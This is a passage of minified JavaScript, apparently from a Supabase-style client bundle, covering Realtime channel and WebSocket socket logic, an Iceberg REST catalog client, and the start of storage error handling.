a,i;if(this.topic=t,this.params=r,this.socket=s,this.bindings={},this.state=Pe.closed,this.joinedOnce=!1,this.pushBuffer=[],this.subTopic=t.replace(/^realtime:/i,""),this.params.config=Object.assign({broadcast:{ack:!1,self:!1},presence:{key:"",enabled:!1},private:!1},r.config),this.timeout=this.socket.timeout,this.joinPush=new eo(this,zt.join,this.params,this.timeout),this.rejoinTimer=new Jm(()=>this._rejoinUntilConnected(),this.socket.reconnectAfterMs),this.joinPush.receive("ok",()=>{this.state=Pe.joined,this.rejoinTimer.reset(),this.pushBuffer.forEach(l=>l.send()),this.pushBuffer=[]}),this._onClose(()=>{this.rejoinTimer.reset(),this.socket.log("channel",`close ${this.topic} ${this._joinRef()}`),this.state=Pe.closed,this.socket._remove(this)}),this._onError(l=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,l),this.state=Pe.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("timeout",()=>{this._isJoining()&&(this.socket.log("channel",`timeout ${this.topic}`,this.joinPush.timeout),this.state=Pe.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("error",l=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,l),this.state=Pe.errored,this.rejoinTimer.scheduleTimeout())}),this._on(zt.reply,{},(l,o)=>{this._trigger(this._replyEventName(o),l)}),this.presence=new Gn(this),this.broadcastEndpointURL=Qm(this.socket.endPoint),this.private=this.params.config.private||!1,!this.private&&(!((i=(a=this.params.config)===null||a===void 0?void 0:a.broadcast)===null||i===void 0)&&i.replay))throw`tried to use replay on public channel '${this.topic}'. It must be a private channel.`}subscribe(t,r=this.timeout){var s,a,i;if(this.socket.isConnected()||this.socket.connect(),this.state==Pe.closed){const{config:{broadcast:l,presence:o,private:c}}=this.params,u=(a=(s=this.bindings.postgres_changes)===null||s===void 0?void 0:s.map(v=>v.filter))!==null&&a!==void 0?a:[],h=!!this.bindings[Jn.PRESENCE]&&this.bindings[Jn.PRESENCE].length>0||((i=this.params.config.presence)===null||i===void 0?void 0:i.enabled)===!0,p={},x={broadcast:l,presence:Object.assign(Object.assign({},o),{enabled:h}),postgres_changes:u,private:c};this.socket.accessTokenValue&&(p.access_token=this.socket.accessTokenValue),this._onError(v=>t==null?void 0:t(tr.CHANNEL_ERROR,v)),this._onClose(()=>t==null?void 0:t(tr.CLOSED)),this.updateJoinPayload(Object.assign({config:x},p)),this.joinedOnce=!0,this._rejoin(r),this.joinPush.receive("ok",async({postgres_changes:v})=>{var f;if(this.socket._isManualToken()||this.socket.setAuth(),v===void 0){t==null||t(tr.SUBSCRIBED);return}else{const w=this.bindings.postgres_changes,j=(f=w==null?void 0:w.length)!==null&&f!==void 0?f:0,y=[];for(let m=0;m<j;m++){const g=w[m],{filter:{event:k,schema:C,table:S,filter:R}}=g,T=v&&v[m];if(T&&T.event===k&&Ks.isFilterValueEqual(T.schema,C)&&Ks.isFilterValueEqual(T.table,S)&&Ks.isFilterValueEqual(T.filter,R))y.push(Object.assign(Object.assign({},g),{id:T.id}));else{this.unsubscribe(),this.state=Pe.errored,t==null||t(tr.CHANNEL_ERROR,new Error("mismatch between server and client bindings for postgres changes"));return}}this.bindings.postgres_changes=y,t&&t(tr.SUBSCRIBED);return}}).receive("error",v=>{this.state=Pe.errored,t==null||t(tr.CHANNEL_ERROR,new Error(JSON.stringify(Object.values(v).join(", ")||"error")))}).receive("timeout",()=>{t==null||t(tr.TIMED_OUT)})}return this}presenceState(){return this.presence.state}async track(t,r={}){return await this.send({type:"presence",event:"track",payload:t},r.timeout||this.timeout)}async untrack(t={}){return await this.send({type:"presence",event:"untrack"},t)}on(t,r,s){return this.state===Pe.joined&&t===Jn.PRESENCE&&(this.socket.log("channel",`resubscribe to ${this.topic} due to change in presence callbacks on joined channel`),this.unsubscribe().then(async()=>await this.subscribe())),this._on(t,r,s)}async httpSend(t,r,s={}){var a;if(r==null)return Promise.reject("Payload is required for httpSend()");const i={apikey:this.socket.apiKey?this.socket.apiKey:"","Content-Type":"application/json"};this.socket.accessTokenValue&&(i.Authorization=`Bearer ${this.socket.accessTokenValue}`);const l={method:"POST",headers:i,body:JSON.stringify({messages:[{topic:this.subTopic,event:t,payload:r,private:this.private}]})},o=await this._fetchWithTimeout(this.broadcastEndpointURL,l,(a=s.timeout)!==null&&a!==void 0?a:this.timeout);if(o.status===202)return{success:!0};let c=o.statusText;try{const u=await o.json();c=u.error||u.message||c}catch{}return Promise.reject(new Error(c))}async send(t,r={}){var s,a;if(!this._canPush()&&t.type==="broadcast"){console.warn("Realtime send() is automatically falling back to REST API. This behavior will be deprecated in the future. Please use httpSend() explicitly for REST delivery.");const{event:i,payload:l}=t,o={apikey:this.socket.apiKey?this.socket.apiKey:"","Content-Type":"application/json"};this.socket.accessTokenValue&&(o.Authorization=`Bearer ${this.socket.accessTokenValue}`);const c={method:"POST",headers:o,body:JSON.stringify({messages:[{topic:this.subTopic,event:i,payload:l,private:this.private}]})};try{const u=await this._fetchWithTimeout(this.broadcastEndpointURL,c,(s=r.timeout)!==null&&s!==void 0?s:this.timeout);return await((a=u.body)===null||a===void 0?void 0:a.cancel()),u.ok?"ok":"error"}catch(u){return u.name==="AbortError"?"timed out":"error"}}else return new Promise(i=>{var l,o,c;const u=this._push(t.type,t,r.timeout||this.timeout);t.type==="broadcast"&&!(!((c=(o=(l=this.params)===null||l===void 0?void 0:l.config)===null||o===void 0?void 0:o.broadcast)===null||c===void 0)&&c.ack)&&i("ok"),u.receive("ok",()=>i("ok")),u.receive("error",()=>i("error")),u.receive("timeout",()=>i("timed out"))})}updateJoinPayload(t){this.joinPush.updatePayload(t)}unsubscribe(t=this.timeout){this.state=Pe.leaving;const r=()=>{this.socket.log("channel",`leave ${this.topic}`),this._trigger(zt.close,"leave",this._joinRef())};this.joinPush.destroy();let s=null;return new Promise(a=>{s=new eo(this,zt.leave,{},t),s.receive("ok",()=>{r(),a("ok")}).receive("timeout",()=>{r(),a("timed out")}).receive("error",()=>{a("error")}),s.send(),this._canPush()||s.trigger("ok",{})}).finally(()=>{s==null||s.destroy()})}teardown(){this.pushBuffer.forEach(t=>t.destroy()),this.pushBuffer=[],this.rejoinTimer.reset(),this.joinPush.destroy(),this.state=Pe.closed,this.bindings={}}async _fetchWithTimeout(t,r,s){const a=new AbortController,i=setTimeout(()=>a.abort(),s),l=await this.socket.fetch(t,Object.assign(Object.assign({},r),{signal:a.signal}));return clearTimeout(i),l}_push(t,r,s=this.timeout){if(!this.joinedOnce)throw`tried to push '${t}' to '${this.topic}' before joining. Use channel.subscribe() before pushing events`;let a=new eo(this,t,r,s);return this._canPush()?a.send():this._addToPushBuffer(a),a}_addToPushBuffer(t){if(t.startTimeout(),this.pushBuffer.push(t),this.pushBuffer.length>yy){const r=this.pushBuffer.shift();r&&(r.destroy(),this.socket.log("channel",`discarded push due to buffer overflow: ${r.event}`,r.payload))}}_onMessage(t,r,s){return r}_isMember(t){return this.topic===t}_joinRef(){return this.joinPush.ref}_trigger(t,r,s){var a,i;const l=t.toLocaleLowerCase(),{close:o,error:c,leave:u,join:h}=zt;if(s&&[o,c,u,h].indexOf(l)>=0&&s!==this._joinRef())return;let x=this._onMessage(l,r,s);if(r&&!x)throw"channel onMessage callbacks must return the payload, modified or unmodified";["insert","update","delete"].includes(l)?(a=this.bindings.postgres_changes)===null||a===void 0||a.filter(v=>{var f,w,j;return((f=v.filter)===null||f===void 0?void 0:f.event)==="*"||((j=(w=v.filter)===null||w===void 0?void 0:w.event)===null||j===void 0?void 0:j.toLocaleLowerCase())===l}).map(v=>v.callback(x,s)):(i=this.bindings[l])===null||i===void 0||i.filter(v=>{var f,w,j,y,m,g,k,C;if(["broadcast","presence","postgres_changes"].includes(l))if("id"in v){const S=v.id,R=(f=v.filter)===null||f===void 0?void 0:f.event;return S&&((w=r.ids)===null||w===void 0?void 0:w.includes(S))&&(R==="*"||(R==null?void 0:R.toLocaleLowerCase())===((j=r.data)===null||j===void 0?void 0:j.type.toLocaleLowerCase()))&&(!(!((y=v.filter)===null||y===void 0)&&y.table)||v.filter.table===((m=r.data)===null||m===void 0?void 0:m.table))}else{const S=(k=(g=v==null?void 0:v.filter)===null||g===void 0?void 0:g.event)===null||k===void 0?void 0:k.toLocaleLowerCase();return S==="*"||S===((C=r==null?void 0:r.event)===null||C===void 0?void 0:C.toLocaleLowerCase())}else return v.type.toLocaleLowerCase()===l}).map(v=>{if(typeof x=="object"&&"ids"in x){const f=x.data,{schema:w,table:j,commit_timestamp:y,type:m,errors:g}=f;x=Object.assign(Object.assign({},{schema:w,table:j,commit_timestamp:y,eventType:m,new:{},old:{},errors:g}),this._getPayloadRecords(f))}v.callback(x,s)})}_isClosed(){return this.state===Pe.closed}_isJoined(){return this.state===Pe.joined}_isJoining(){return this.state===Pe.joining}_isLeaving(){return this.state===Pe.leaving}_replyEventName(t){return`chan_reply_${t}`}_on(t,r,s){const a=t.toLocaleLowerCase(),i={type:a,filter:r,callback:s};return this.bindings[a]?this.bindings[a].push(i):this.bindings[a]=[i],this}_off(t,r){const s=t.toLocaleLowerCase();return this.bindings[s]&&(this.bindings[s]=this.bindings[s].filter(a=>{var i;return!(((i=a.type)===null||i===void 0?void 0:i.toLocaleLowerCase())===s&&Ks.isEqual(a.filter,r))})),this}static isEqual(t,r){if(Object.keys(t).length!==Object.keys(r).length)return!1;for(const s in t)if(t[s]!==r[s])return!1;return!0}static isFilterValueEqual(t,r){return(t??void 0)===(r??void 0)}_rejoinUntilConnected(){this.rejoinTimer.scheduleTimeout(),this.socket.isConnected()&&this._rejoin()}_onClose(t){this._on(zt.close,{},t)}_onError(t){this._on(zt.error,{},r=>t(r))}_canPush(){return this.socket.isConnected()&&this._isJoined()}_rejoin(t=this.timeout){this._isLeaving()||(this.socket._leaveOpenTopic(this.topic),this.state=Pe.joining,this.joinPush.resend(t))}_getPayloadRecords(t){const r={new:{},old:{}};return(t.type==="INSERT"||t.type==="UPDATE")&&(r.new=eh(t.columns,t.record)),(t.type==="UPDATE"||t.type==="DELETE")&&(r.old=eh(t.columns,t.old_record)),r}}const to=()=>{},qa={HEARTBEAT_INTERVAL:25e3,RECONNECT_DELAY:10,HEARTBEAT_TIMEOUT_FALLBACK:100},Sy=[1e3,2e3,5e3,1e4],Ey=1e4,Cy=`
  addEventListener("message", (e) => {
    if (e.data.event === "start") {
      setInterval(() => postMessage({ event: "keepAlive" }), e.data.interval);
    }
  });`;class Ty{constructor(t,r){var s;if(this.accessTokenValue=null,this.apiKey=null,this._manuallySetToken=!1,this.channels=new Array,this.endPoint="",this.httpEndpoint="",this.headers={},this.params={},this.timeout=uc,this.transport=null,this.heartbeatIntervalMs=qa.HEARTBEAT_INTERVAL,this.heartbeatTimer=void 0,this.pendingHeartbeatRef=null,this.heartbeatCallback=to,this.ref=0,this.reconnectTimer=null,this.vsn=Zd,this.logger=to,this.conn=null,this.sendBuffer=[],this.serializer=new vy,this.stateChangeCallbacks={open:[],close:[],error:[],message:[]},this.accessToken=null,this._connectionState="disconnected",this._wasManualDisconnect=!1,this._authPromise=null,this._heartbeatSentAt=null,this._resolveFetch=a=>a?(...i)=>a(...i):(...i)=>fetch(...i),!(!((s=r==null?void 0:r.params)===null||s===void 0)&&s.apikey))throw new Error("API key is required to connect to Realtime");this.apiKey=r.params.apikey,this.endPoint=`${t}/${dc.websocket}`,this.httpEndpoint=Qm(t),this._initializeOptions(r),this._setupReconnectionTimer(),this.fetch=this._resolveFetch(r==null?void 0:r.fetch)}connect(){if(!(this.isConnecting()||this.isDisconnecting()||this.conn!==null&&this.isConnected())){if(this._setConnectionState("connecting"),this.accessToken&&!this._authPromise&&this._setAuthSafely("connect"),this.transport)this.conn=new this.transport(this.endpointURL());else try{this.conn=fy.createWebSocket(this.endpointURL())}catch(t){this._setConnectionState("disconnected");const r=t.message;throw r.includes("Node.js")?new Error(`${r}

To use Realtime in Node.js, you need to provide a WebSocket implementation:

Option 1: Use Node.js 22+ which has native WebSocket support
Option 2: Install and provide the "ws" package:

  npm install ws

  import ws from "ws"
  const client = new RealtimeClient(url, {
    ...options,
    transport: ws
  })`):new Error(`WebSocket not available: ${r}`)}this._setupConnectionHandlers()}}endpointURL(){return this._appendParams(this.endPoint,Object.assign({},this.params,{vsn:this.vsn}))}disconnect(t,r){if(!this.isDisconnecting())if(this._setConnectionState("disconnecting",!0),this.conn){const s=setTimeout(()=>{this._setConnectionState("disconnected")},100);this.conn.onclose=()=>{clearTimeout(s),this._setConnectionState("disconnected")},typeof this.conn.close=="function"&&(t?this.conn.close(t,r??""):this.conn.close()),this._teardownConnection()}else this._setConnectionState("disconnected")}getChannels(){return this.channels}async removeChannel(t){const r=await t.unsubscribe();return this.channels.length===0&&this.disconnect(),r}async removeAllChannels(){const t=await Promise.all(this.channels.map(r=>r.unsubscribe()));return this.channels=[],this.disconnect(),t}log(t,r,s){this.logger(t,r,s)}connectionState(){switch(this.conn&&this.conn.readyState){case wr.connecting:return cs.Connecting;case wr.open:return cs.Open;case wr.closing:return cs.Closing;default:return cs.Closed}}isConnected(){return this.connectionState()===cs.Open}isConnecting(){return this._connectionState==="connecting"}isDisconnecting(){return this._connectionState==="disconnecting"}channel(t,r={config:{}}){const s=`realtime:${t}`,a=this.getChannels().find(i=>i.topic===s);if(a)return a;{const i=new Ks(`realtime:${t}`,r,this);return this.channels.push(i),i}}push(t){const{topic:r,event:s,payload:a,ref:i}=t,l=()=>{this.encode(t,o=>{var c;(c=this.conn)===null||c===void 0||c.send(o)})};this.log("push",`${r} ${s} (${i})`,a),this.isConnected()?l():this.sendBuffer.push(l)}async setAuth(t=null){this._authPromise=this._performAuth(t);try{await this._authPromise}finally{this._authPromise=null}}_isManualToken(){return this._manuallySetToken}async sendHeartbeat(){var t;if(!this.isConnected()){try{this.heartbeatCallback("disconnected")}catch(r){this.log("error","error in heartbeat callback",r)}return}if(this.pendingHeartbeatRef){this.pendingHeartbeatRef=null,this._heartbeatSentAt=null,this.log("transport","heartbeat timeout. Attempting to re-establish connection");try{this.heartbeatCallback("timeout")}catch(r){this.log("error","error in heartbeat callback",r)}this._wasManualDisconnect=!1,(t=this.conn)===null||t===void 0||t.close(gy,"heartbeat timeout"),setTimeout(()=>{var r;this.isConnected()||(r=this.reconnectTimer)===null||r===void 0||r.scheduleTimeout()},qa.HEARTBEAT_TIMEOUT_FALLBACK);return}this._heartbeatSentAt=Date.now(),this.pendingHeartbeatRef=this._makeRef(),this.push({topic:"phoenix",event:"heartbeat",payload:{},ref:this.pendingHeartbeatRef});try{this.heartbeatCallback("sent")}catch(r){this.log("error","error in heartbeat callback",r)}this._setAuthSafely("heartbeat")}onHeartbeat(t){this.heartbeatCallback=t}flushSendBuffer(){this.isConnected()&&this.sendBuffer.length>0&&(this.sendBuffer.forEach(t=>t()),this.sendBuffer=[])}_makeRef(){let t=this.ref+1;return t===this.ref?this.ref=0:this.ref=t,this.ref.toString()}_leaveOpenTopic(t){let r=this.channels.find(s=>s.topic===t&&(s._isJoined()||s._isJoining()));r&&(this.log("transport",`leaving duplicate topic "${t}"`),r.unsubscribe())}_remove(t){this.channels=this.channels.filter(r=>r.topic!==t.topic)}_onConnMessage(t){this.decode(t.data,r=>{if(r.topic==="phoenix"&&r.event==="phx_reply"&&r.ref&&r.ref===this.pendingHeartbeatRef){const u=this._heartbeatSentAt?Date.now()-this._heartbeatSentAt:void 0;try{this.heartbeatCallback(r.payload.status==="ok"?"ok":"error",u)}catch(h){this.log("error","error in heartbeat callback",h)}this._heartbeatSentAt=null,this.pendingHeartbeatRef=null}const{topic:s,event:a,payload:i,ref:l}=r,o=l?`(${l})`:"",c=i.status||"";this.log("receive",`${c} ${s} ${a} ${o}`.trim(),i),this.channels.filter(u=>u._isMember(s)).forEach(u=>u._trigger(a,i,l)),this._triggerStateCallbacks("message",r)})}_clearTimer(t){var r;t==="heartbeat"&&this.heartbeatTimer?(clearInterval(this.heartbeatTimer),this.heartbeatTimer=void 0):t==="reconnect"&&((r=this.reconnectTimer)===null||r===void 0||r.reset())}_clearAllTimers(){this._clearTimer("heartbeat"),this._clearTimer("reconnect")}_setupConnectionHandlers(){this.conn&&("binaryType"in this.conn&&(this.conn.binaryType="arraybuffer"),this.conn.onopen=()=>this._onConnOpen(),this.conn.onerror=t=>this._onConnError(t),this.conn.onmessage=t=>this._onConnMessage(t),this.conn.onclose=t=>this._onConnClose(t),this.conn.readyState===wr.open&&this._onConnOpen())}_teardownConnection(){if(this.conn){if(this.conn.readyState===wr.open||this.conn.readyState===wr.connecting)try{this.conn.close()}catch(t){this.log("error","Error closing connection",t)}this.conn.onopen=null,this.conn.onerror=null,this.conn.onmessage=null,this.conn.onclose=null,this.conn=null}this._clearAllTimers(),this._terminateWorker(),this.channels.forEach(t=>t.teardown())}_onConnOpen(){this._setConnectionState("connected"),this.log("transport",`connected to ${this.endpointURL()}`),(this._authPromise||(this.accessToken&&!this.accessTokenValue?this.setAuth():Promise.resolve())).then(()=>{this.flushSendBuffer()}).catch(r=>{this.log("error","error waiting for auth on connect",r),this.flushSendBuffer()}),this._clearTimer("reconnect"),this.worker?this.workerRef||this._startWorkerHeartbeat():this._startHeartbeat(),this._triggerStateCallbacks("open")}_startHeartbeat(){this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.heartbeatTimer=setInterval(()=>this.sendHeartbeat(),this.heartbeatIntervalMs)}_startWorkerHeartbeat(){this.workerUrl?this.log("worker",`starting worker for from ${this.workerUrl}`):this.log("worker","starting default worker");const t=this._workerObjectUrl(this.workerUrl);this.workerRef=new Worker(t),this.workerRef.onerror=r=>{this.log("worker","worker error",r.message),this._terminateWorker()},this.workerRef.onmessage=r=>{r.data.event==="keepAlive"&&this.sendHeartbeat()},this.workerRef.postMessage({event:"start",interval:this.heartbeatIntervalMs})}_terminateWorker(){this.workerRef&&(this.log("worker","terminating worker"),this.workerRef.terminate(),this.workerRef=void 0)}_onConnClose(t){var r;this._setConnectionState("disconnected"),this.log("transport","close",t),this._triggerChanError(),this._clearTimer("heartbeat"),this._wasManualDisconnect||(r=this.reconnectTimer)===null||r===void 0||r.scheduleTimeout(),this._triggerStateCallbacks("close",t)}_onConnError(t){this._setConnectionState("disconnected"),this.log("transport",`${t}`),this._triggerChanError(),this._triggerStateCallbacks("error",t)}_triggerChanError(){this.channels.forEach(t=>t._trigger(zt.error))}_appendParams(t,r){if(Object.keys(r).length===0)return t;const s=t.match(/\?/)?"&":"?",a=new URLSearchParams(r);return`${t}${s}${a}`}_workerObjectUrl(t){let r;if(t)r=t;else{const s=new Blob([Cy],{type:"application/javascript"});r=URL.createObjectURL(s)}return r}_setConnectionState(t,r=!1){this._connectionState=t,t==="connecting"?this._wasManualDisconnect=!1:t==="disconnecting"&&(this._wasManualDisconnect=r)}async _performAuth(t=null){let r,s=!1;if(t)r=t,s=!0;else if(this.accessToken)try{r=await this.accessToken()}catch(a){this.log("error","Error fetching access token from callback",a),r=this.accessTokenValue}else r=this.accessTokenValue;s?this._manuallySetToken=!0:this.accessToken&&(this._manuallySetToken=!1),this.accessTokenValue!=r&&(this.accessTokenValue=r,this.channels.forEach(a=>{const i={access_token:r,version:py};r&&a.updateJoinPayload(i),a.joinedOnce&&a._isJoined()&&a._push(zt.access_token,{access_token:r})}))}async _waitForAuthIfNeeded(){this._authPromise&&await this._authPromise}_setAuthSafely(t="general"){this._isManualToken()||this.setAuth().catch(r=>{this.log("error",`Error setting auth in ${t}`,r)})}_triggerStateCallbacks(t,r){try{this.stateChangeCallbacks[t].forEach(s=>{try{s(r)}catch(a){this.log("error",`error in ${t} callback`,a)}})}catch(s){this.log("error",`error triggering ${t} callbacks`,s)}}_setupReconnectionTimer(){this.reconnectTimer=new Jm(async()=>{setTimeout(async()=>{await this._waitForAuthIfNeeded(),this.isConnected()||this.connect()},qa.RECONNECT_DELAY)},this.reconnectAfterMs)}_initializeOptions(t){var r,s,a,i,l,o,c,u,h,p,x,v;switch(this.transport=(r=t==null?void 0:t.transport)!==null&&r!==void 0?r:null,this.timeout=(s=t==null?void 0:t.timeout)!==null&&s!==void 0?s:uc,this.heartbeatIntervalMs=(a=t==null?void 0:t.heartbeatIntervalMs)!==null&&a!==void 0?a:qa.HEARTBEAT_INTERVAL,this.worker=(i=t==null?void 0:t.worker)!==null&&i!==void 0?i:!1,this.accessToken=(l=t==null?void 0:t.accessToken)!==null&&l!==void 0?l:null,this.heartbeatCallback=(o=t==null?void 0:t.heartbeatCallback)!==null&&o!==void 0?o:to,this.vsn=(c=t==null?void 0:t.vsn)!==null&&c!==void 0?c:Zd,t!=null&&t.params&&(this.params=t.params),t!=null&&t.logger&&(this.logger=t.logger),(t!=null&&t.logLevel||t!=null&&t.log_level)&&(this.logLevel=t.logLevel||t.log_level,this.params=Object.assign(Object.assign({},this.params),{log_level:this.logLevel})),this.reconnectAfterMs=(u=t==null?void 0:t.reconnectAfterMs)!==null&&u!==void 0?u:f=>Sy[f-1]||Ey,this.vsn){case Gm:this.encode=(h=t==null?void 0:t.encode)!==null&&h!==void 0?h:(f,w)=>w(JSON.stringify(f)),this.decode=(p=t==null?void 0:t.decode)!==null&&p!==void 0?p:(f,w)=>w(JSON.parse(f));break;case xy:this.encode=(x=t==null?void 0:t.encode)!==null&&x!==void 0?x:this.serializer.encode.bind(this.serializer),this.decode=(v=t==null?void 0:t.decode)!==null&&v!==void 0?v:this.serializer.decode.bind(this.serializer);break;default:throw new Error(`Unsupported serializer version: ${this.vsn}`)}if(this.worker){if(typeof window<"u"&&!window.Worker)throw new Error("Web Worker is not supported");this.workerUrl=t==null?void 0:t.workerUrl}}}var xa=class extends Error{constructor(e,t){var r;super(e),this.name="IcebergError",this.status=t.status,this.icebergType=t.icebergType,this.icebergCode=t.icebergCode,this.details=t.details,this.isCommitStateUnknown=t.icebergType==="CommitStateUnknownException"||[500,502,504].includes(t.status)&&((r=t.icebergType)==null?void 0:r.includes("CommitState"))===!0}isNotFound(){return this.status===404}isConflict(){return this.status===409}isAuthenticationTimeout(){return this.status===419}};function Ry(e,t,r){const s=new URL(t,e);if(r)for(const[a,i]of Object.entries(r))i!==void 0&&s.searchParams.set(a,i);return s.toString()}async function Py(e){return!e||e.type==="none"?{}:e.type==="bearer"?{Authorization:`Bearer ${e.token}`}:e.type==="header"?{[e.name]:e.value}:e.type==="custom"?await e.getHeaders():{}}function Ay(e){const t=e.fetchImpl??globalThis.fetch;return{async request({method:r,path:s,query:a,body:i,headers:l}){const o=Ry(e.baseUrl,s,a),c=await Py(e.auth),u=await t(o,{method:r,headers:{...i?{"Content-Type":"application/json"}:{},...c,...l},body:i?JSON.stringify(i):void 0}),h=await u.text(),p=(u.headers.get("content-type")||"").includes("application/json"),x=p&&h?JSON.parse(h):h;if(!u.ok){const v=p?x:void 0,f=v==null?void 0:v.error;throw new xa((f==null?void 0:f.message)??`Request failed with status ${u.status}`,{status:u.status,icebergType:f==null?void 0:f.type,icebergCode:f==null?void 0:f.code,details:v})}return{status:u.status,headers:u.headers,data:x}}}}function Ha(e){return e.join("")}var Oy=class{constructor(e,t=""){this.client=e,this.prefix=t}async listNamespaces(e){const t=e?{parent:Ha(e.namespace)}:void 0;return(await this.client.request({method:"GET",path:`${this.prefix}/namespaces`,query:t})).data.namespaces.map(s=>({namespace:s}))}async createNamespace(e,t){const r={namespace:e.namespace,properties:t==null?void 0:t.properties};return(await this.client.request({method:"POST",path:`${this.prefix}/namespaces`,body:r})).data}async dropNamespace(e){await this.client.request({method:"DELETE",path:`${this.prefix}/namespaces/${Ha(e.namespace)}`})}async loadNamespaceMetadata(e){return{properties:(await this.client.request({method:"GET",path:`${this.prefix}/namespaces/${Ha(e.namespace)}`})).data.properties}}async namespaceExists(e){try{return await this.client.request({method:"HEAD",path:`${this.prefix}/namespaces/${Ha(e.namespace)}`}),!0}catch(t){if(t instanceof xa&&t.status===404)return!1;throw t}}async createNamespaceIfNotExists(e,t){try{return await this.createNamespace(e,t)}catch(r){if(r instanceof xa&&r.status===409)return;throw r}}};function Ss(e){return e.join("")}var Iy=class{constructor(e,t="",r){this.client=e,this.prefix=t,this.accessDelegation=r}async listTables(e){return(await this.client.request({method:"GET",path:`${this.prefix}/namespaces/${Ss(e.namespace)}/tables`})).data.identifiers}async createTable(e,t){const r={};return this.accessDelegation&&(r["X-Iceberg-Access-Delegation"]=this.accessDelegation),(await this.client.request({method:"POST",path:`${this.prefix}/namespaces/${Ss(e.namespace)}/tables`,body:t,headers:r})).data.metadata}async updateTable(e,t){const r=await this.client.request({method:"POST",path:`${this.prefix}/namespaces/${Ss(e.namespace)}/tables/${e.name}`,body:t});return{"metadata-location":r.data["metadata-location"],metadata:r.data.metadata}}async dropTable(e,t){await this.client.request({method:"DELETE",path:`${this.prefix}/namespaces/${Ss(e.namespace)}/tables/${e.name}`,query:{purgeRequested:String((t==null?void 0:t.purge)??!1)}})}async loadTable(e){const t={};return this.accessDelegation&&(t["X-Iceberg-Access-Delegation"]=this.accessDelegation),(await this.client.request({method:"GET",path:`${this.prefix}/namespaces/${Ss(e.namespace)}/tables/${e.name}`,headers:t})).data.metadata}async tableExists(e){const t={};this.accessDelegation&&(t["X-Iceberg-Access-Delegation"]=this.accessDelegation);try{return await this.client.request({method:"HEAD",path:`${this.prefix}/namespaces/${Ss(e.namespace)}/tables/${e.name}`,headers:t}),!0}catch(r){if(r instanceof xa&&r.status===404)return!1;throw r}}async createTableIfNotExists(e,t){try{return await this.createTable(e,t)}catch(r){if(r instanceof xa&&r.status===409)return await this.loadTable({namespace:e.namespace,name:t.name});throw r}}},$y=class{constructor(e){var s;let t="v1";e.catalogName&&(t+=`/${e.catalogName}`);const r=e.baseUrl.endsWith("/")?e.baseUrl:`${e.baseUrl}/`;this.client=Ay({baseUrl:r,auth:e.auth,fetchImpl:e.fetch}),this.accessDelegation=(s=e.accessDelegation)==null?void 0:s.join(","),this.namespaceOps=new Oy(this.client,t),this.tableOps=new Iy(this.client,t,this.accessDelegation)}async listNamespaces(e){return this.namespaceOps.listNamespaces(e)}async createNamespace(e,t){return this.namespaceOps.createNamespace(e,t)}async dropNamespace(e){await this.namespaceOps.dropNamespace(e)}async loadNamespaceMetadata(e){return this.namespaceOps.loadNamespaceMetadata(e)}async listTables(e){return this.tableOps.listTables(e)}async createTable(e,t){return this.tableOps.createTable(e,t)}async updateTable(e,t){return this.tableOps.updateTable(e,t)}async dropTable(e,t){await this.tableOps.dropTable(e,t)}async loadTable(e){return this.tableOps.loadTable(e)}async namespaceExists(e){return this.namespaceOps.namespaceExists(e)}async tableExists(e){return this.tableOps.tableExists(e)}async createNamespaceIfNotExists(e,t){return this.namespaceOps.createNamespaceIfNotExists(e,t)}async createTableIfNotExists(e,t){return this.tableOps.createTableIfNotExists(e,t)}},ul=class extends Error{constructor(e){super(e),this.__isStorageError=!0,this.name="StorageError"}};function ye(e){return typeof e=="object"&&e!==null&&"__isStorageError"in e}var zy=class extends ul{constructor(e,t,r){super(e),this.name="StorageApiError",this.status=t,this.statusCode=r}toJSON(){return{name:this.name,message:this.message,status:this.status,statusCode:this.statusCode}}},fc=class extends ul{constructor(e,t){super(e),this.name="StorageUnknownError",this.originalError=t}};const Su=e=>e?(...t)=>e(...t):(...t)=>fetch(...t),Ly=()=>Response,mc=e=>{if(Array.isArray(e))return e.map(r=>mc(r));if(typeof e=="function"||e!==Object(e))return e;const t={};return Object.entries(e).forEach(([r,s])=>{const a=r.replace(/([-_][a-z])/gi,i=>i.toUpperCase().replace(/[-_]/g,""));t[a]=mc(s)}),t},Uy=e=>{if(typeof e!="object"||e===null)return!1;const t=Object.getPrototypeOf(e);return(t===null||t===Object.prototype||Object.getPrototypeOf(t)===null)&&!(Symbol.toStringTag in e)&&!(Symbol.iterator in e)},Dy=e=>!e||typeof e!="string"||e.length===0||e.length>100||e.trim()!==e||e.includes("/")||e.includes("\\")?!1:/^[\w!.\*'() &$@=;:+,?-]+$/.test(e);function ga(e){"@babel/helpers - typeof";return ga=typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?function(t){return typeof t}:function(t){return t&&typeof Symbol=="function"&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},ga(e)}function My(e,t){if(ga(e)!="object"||!e)return e;var r=e[Symbol.toPrimitive];if(r!==void 0){var s=r.call(e,t);if(ga(s)!="object")return s;throw new TypeError("@@toPrimitive must return a primitive value.")}return(t==="string"?String:Number)(e)}function Fy(e){var t=My(e,"string");return ga(t)=="symbol"?t:t+""}function By(e,t,r){return(t=Fy(t))in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function sh(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);t&&(s=s.filter(function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable})),r.push.apply(r,s)}return r}function q(e){for(var t=1;t<arguments.length;t++){var r=arguments[t]!=null?arguments[t]:{};t%2?sh(Object(r),!0).forEach(function(s){By(e,s,r[s])}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):sh(Object(r)).forEach(function(s){Object.defineProperty(e,s,Object.getOwnPropertyDescriptor(r,s))})}return e}const ro=e=>{var t;return e.msg||e.message||e.error_description||(typeof e.error=="string"?e.error:(t=e.error)===null||t===void 0?void 0:t.message)||JSON.stringify(e)},Wy=async(e,t,r)=>{e instanceof await Ly()&&!(r!=null&&r.noResolveJson)?e.json().then(s=>{const a=e.status||500,i=(s==null?void 0:s.statusCode)||a+"";t(new zy(ro(s),a,i))}).catch(s=>{t(new fc(ro(s),s))}):t(new 